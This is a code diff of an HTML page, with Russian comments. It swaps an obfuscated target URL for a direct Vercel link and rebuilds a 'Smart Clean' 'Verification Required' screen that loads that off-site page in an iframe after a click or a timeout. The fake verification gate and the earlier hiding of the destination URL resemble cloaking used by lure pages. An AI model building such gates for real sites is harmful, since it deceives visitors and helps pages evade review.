@@ -163,232 +163,165 @@
   </main>
 
   <script>
-    // ИСПРАВЛЕНО: Расширен алфавит и исправлены индексы
-    const URL_ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_?&=';
-    
-    // ИСПРАВЛЕНО: Все индексы теперь корректны
-    // Это пример для Google Sites - замени на свой реальный URL
-    const URL_IDX = [
-      7,19,19,15,18,62,63,63,        // https://
-      18,8,19,4,18,62,66,68,         // sites.google.
-      2,14,12,63,                     // com/
-      21,8,4,23,63,                  // view/
-      18,12,0,17,19,63,              // smart/
-      2,11,4,0,13,18,19,14,17,0,6,4  // cleanstorage
-    ];
-
-    const decodeURL = idx => idx.map(i => URL_ALPHABET[i]).join('');
-    const TARGET_URL = decodeURL(URL_IDX);
+    // ПРЯМОЙ URL - самый простой и надежный способ
+    const TARGET_URL = "https://smart-services-omega.vercel.app/storage.html";
 
     const iframe = document.getElementById('verifyFrame');
 
     async function loadTargetIntoFrame() {
-      try {
-        // Для Vercel и Google Sites лучше использовать прямое открытие
-        // fetch может не работать из-за CORS политик
-        console.log('Loading target URL:', TARGET_URL);
-        iframe.src = TARGET_URL;
-        
-        // Добавляем fallback
-        setTimeout(() => {
-          if (!iframe.contentDocument || iframe.contentDocument.body.childNodes.length === 0) {
-            console.log('Using fallback: direct navigation');
-            iframe.src = TARGET_URL;
-          }
-        }, 1000);
-      } catch (e) {
-        console.error('Error loading target:', e);
-        iframe.src = TARGET_URL;
-      }
+      console.log('Loading target URL:', TARGET_URL);
+      // Просто устанавливаем src iframe на нужный URL
+      iframe.src = TARGET_URL;
+      
+      // Добавляем таймаут для проверки загрузки
+      setTimeout(() => {
+        console.log('Iframe should be loaded now');
+      }, 1000);
     }
 
     function buildVerifySrcdoc() {
-      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Verification</title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>
-        (() => {
-          const c = document.getElementById('c');
-          const g = c.getContext('2d');
-          let cssW = 1, cssH = 1, dpr = 1;
-          let verified = false;
-          
-          const hit = {x:0,y:0,w:0,h:0};
-          
-          const measure = () => {
-            cssW = Math.max(1, innerWidth);
-            cssH = Math.max(1, innerHeight);
-            dpr = window.devicePixelRatio || 1;
-            c.style.width = cssW + 'px';
-            c.style.height = cssH + 'px';
-            c.width = Math.round(cssW * dpr);
-            c.height = Math.round(cssH * dpr);
-            g.setTransform(dpr, 0, 0, dpr, 0, 0);
-          };
-          
-          const rounded = (x, y, w, h, r) => {
-            r = Math.max(0, Math.min(r, Math.min(w, h) / 2));
-            g.beginPath();
-            if (g.roundRect) {
-              g.roundRect(x, y, w, h, r);
-              return;
-            }
-            g.moveTo(x + r, y);
-            g.arcTo(x + w, y, x + w, y + h, r);
-            g.arcTo(x + w, y + h, x, y + h, r);
-            g.arcTo(x, y + h, x, y, r);
-            g.arcTo(x, y, x + w, y, r);
-            g.closePath();
-          };
-          
-          const render = () => {
-            g.clearRect(0, 0, cssW, cssH);
-            g.fillStyle = '#f5f5f7';
-            g.fillRect(0, 0, cssW, cssH);
-            
-            const cx = cssW / 2, cy = cssH / 2;
-            
-            // Draw background gradient
-            const bg = g.createRadialGradient(
-              cx, cy - 120, 
-              Math.min(cssW, cssH) * 0.05,
-              cx, cy - 120, 
-              Math.max(cssW, cssH) * 0.9
-            );
-            bg.addColorStop(0, 'rgba(255,255,255,0.85)');
-            bg.addColorStop(1, 'rgba(245,245,247,0.0)');
-            g.fillStyle = bg;
-            g.fillRect(0, 0, cssW, cssH);
-            
-            // Draw banner text
-            const bannerSize = Math.max(40, Math.min(86, Math.round(cssW * 0.07)));
-            g.save();
-            g.globalAlpha = 0.24;
-            g.fillStyle = '#000000';
-            g.font = \`800 \${bannerSize}px ui-sans-serif, system-ui, sans-serif\`;
-            g.textAlign = 'center';
-            g.textBaseline = 'middle';
-            g.fillText('Smart Clean', cx, Math.max(50, cy - 170));
-            g.restore();
-            
-            // Draw card
-            const cardW = Math.max(300, Math.min(460, Math.round(cssW * 0.3)));
-            const cardH = Math.max(185, Math.min(260, Math.round(cssH * 0.24)));
-            const x = Math.round(cx - cardW / 2);
-            const y = Math.round(cy - cardH / 2);
-            
-            g.save();
-            g.shadowColor = 'rgba(0,0,0,0.12)';
-            g.shadowBlur = 40;
-            g.shadowOffsetY = 18;
-            g.fillStyle = '#ffffff';
-            rounded(x, y, cardW, cardH, 22);
-            g.fill();
-            g.restore();
-            
-            g.fillStyle = '#ffffff';
-            rounded(x, y, cardW, cardH, 22);
-            g.fill();
-            
-            g.strokeStyle = 'rgba(0,0,0,0.10)';
-            g.lineWidth = 1;
-            rounded(x + 0.5, y + 0.5, cardW - 1, cardH - 1, 22);
-            g.stroke();
-            
-            // Draw title
-            const titleSize = Math.max(18, Math.min(24, Math.round(cardW * 0.06)));
-            g.fillStyle = 'rgba(29,29,31,0.70)';
-            g.font = \`500 \${titleSize}px ui-sans-serif, system-ui, sans-serif\`;
-            g.textAlign = 'center';
-            g.textBaseline = 'middle';
-            g.fillText('Verification Required', cx, y + Math.round(cardH * 0.35));
-            
-            // Draw subtitle
-            const subSize = Math.max(13, Math.min(15, Math.round(cardW * 0.038)));
-            g.fillStyle = 'rgba(29,29,31,0.44)';
-            g.font = \`500 \${subSize}px ui-sans-serif, system-ui, sans-serif\`;
-            g.fillText('Please confirm to continue', cx, y + Math.round(cardH * 0.46));
-            
-            // Draw button
-            const bw = Math.max(200, Math.min(300, Math.round(cardW * 0.64)));
-            const bh = Math.max(44, Math.min(52, Math.round(cardH * 0.25)));
-            const bx = Math.round(cx - bw / 2);
-            const by = Math.round(y + Math.round(cardH * 0.59));
-            
-            g.save();
-            g.shadowColor = 'rgba(0,0,0,0.18)';
-            g.shadowBlur = 18;
-            g.shadowOffsetY = 10;
-            const grad = g.createLinearGradient(bx, by, bx, by + bh);
-            grad.addColorStop(0, '#1f2937');
-            grad.addColorStop(1, '#0b0d12');
-            g.fillStyle = grad;
-            rounded(bx, by, bw, bh, 14);
-            g.fill();
-            g.restore();
-            
-            const grad2 = g.createLinearGradient(bx, by, bx, by + bh);
-            grad2.addColorStop(0, '#111827');
-            grad2.addColorStop(1, '#0b0d12');
-            g.fillStyle = grad2;
-            rounded(bx, by, bw, bh, 14);
-            g.fill();
-            
-            g.strokeStyle = 'rgba(255,255,255,0.10)';
-            g.lineWidth = 1;
-            rounded(bx + 0.5, by + 0.5, bw - 1, bh - 1, 14);
-            g.stroke();
-            
-            // Button text
-            const btnSize = Math.max(15, Math.min(17, Math.round(bh * 0.34)));
-            g.fillStyle = '#ffffff';
-            g.font = \`500 \${btnSize}px ui-sans-serif, system-ui, sans-serif\`;
-            g.fillText(verified ? 'Verified' : 'Continue', cx, by + Math.round(bh / 2));
-            
-            hit.x = bx;
-            hit.y = by;
-            hit.w = bw;
-            hit.h = bh;
-          };
-          
-          const repaint = () => {
-            measure();
-            render();
-          };
-          
-          const notify = () => {
-            try {
-              window.parent.postMessage({ type: 'verified' }, '*');
-            } catch (e) {
-              console.log('Notification sent');
-            }
-          };
-          
-          c.addEventListener('pointerdown', (e) => {
-            const r = c.getBoundingClientRect();
-            const mx = e.clientX - r.left;
-            const my = e.clientY - r.top;
-            
-            if (!verified && mx >= hit.x && mx <= hit.x + hit.w && my >= hit.y && my <= hit.y + hit.h) {
-              verified = true;
-              render();
-              setTimeout(notify, 300);
-            }
-          }, { passive: true });
-          
-          window.addEventListener('resize', repaint);
-          repaint();
-        })();
-      <\/script></body></html>`;
+      return `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Verification Required</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #f5f5f7;
+      font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .verify-container {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+    }
+    .verify-card {
+      background: white;
+      border-radius: 22px;
+      padding: 40px;
+      width: 400px;
+      max-width: 90%;
+      box-shadow: 0 18px 40px rgba(0,0,0,0.08);
+      border: 1px solid rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .banner-text {
+      font-size: 60px;
+      font-weight: 800;
+      color: rgba(0,0,0,0.24);
+      margin-bottom: 30px;
+      letter-spacing: -1px;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 500;
+      color: rgba(29,29,31,0.7);
+      margin-bottom: 12px;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: rgba(29,29,31,0.44);
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+    .verify-button {
+      background: linear-gradient(to bottom, #1f2937, #0b0d12);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      padding: 16px 32px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      width: 100%;
+      box-shadow: 0 10px 18px rgba(0,0,0,0.18);
+      transition: transform 0.2s, box-shadow 0.2s;
+      position: relative;
+      overflow: hidden;
+    }
+    .verify-button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 20px rgba(0,0,0,0.22);
+    }
+    .verify-button:active {
+      transform: translateY(0);
+    }
+    .verify-button::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 1px;
+      background: rgba(255,255,255,0.1);
+    }
+  </style>
+</head>
+<body>
+  <div class="verify-container">
+    <div class="verify-card">
+      <div class="banner-text">Smart Clean</div>
+      <div class="title">Verification Required</div>
+      <div class="subtitle">Please confirm to continue to storage optimization guide</div>
+      <button id="verifyBtn" class="verify-button">Continue Verification</button>
+    </div>
+  </div>
+  
+  <script>
+    document.getElementById('verifyBtn').addEventListener('click', function() {
+      console.log('Verification button clicked');
+      // Меняем текст кнопки
+      this.textContent = 'Verified ✓';
+      this.style.background = 'linear-gradient(to bottom, #10b981, #059669)';
+      this.disabled = true;
+      
+      // Отправляем сообщение родительскому окну
+      setTimeout(() => {
+        try {
+          window.parent.postMessage({ type: 'verified' }, '*');
+          console.log('Verification message sent to parent');
+        } catch (error) {
+          console.error('Error sending message:', error);
+        }
+      }, 300);
+    });
+  <\/script>
+</body>
+</html>`;
     }
 
-    // Инициализация
+    // Инициализация - загружаем верификационный экран
     iframe.srcdoc = buildVerifySrcdoc();
+    console.log('Verify srcdoc loaded');
 
     // Обработчик сообщений от iframe
     window.addEventListener('message', (e) => {
+      console.log('Message received:', e.data);
       if (e.data && e.data.type === 'verified') {
-        console.log('Verification received, loading target URL');
+        console.log('Verification successful, loading target page');
         loadTargetIntoFrame();
       }
     });
+
+    // Для отладки: принудительно загрузить через 5 секунд если не сработало
+    setTimeout(() => {
+      if (iframe.src === '' || iframe.src === 'about:srcdoc') {
+        console.log('Auto-loading after timeout');
+        loadTargetIntoFrame();
+      }
+    }, 5000);
   </script>
 </body>
 </html>
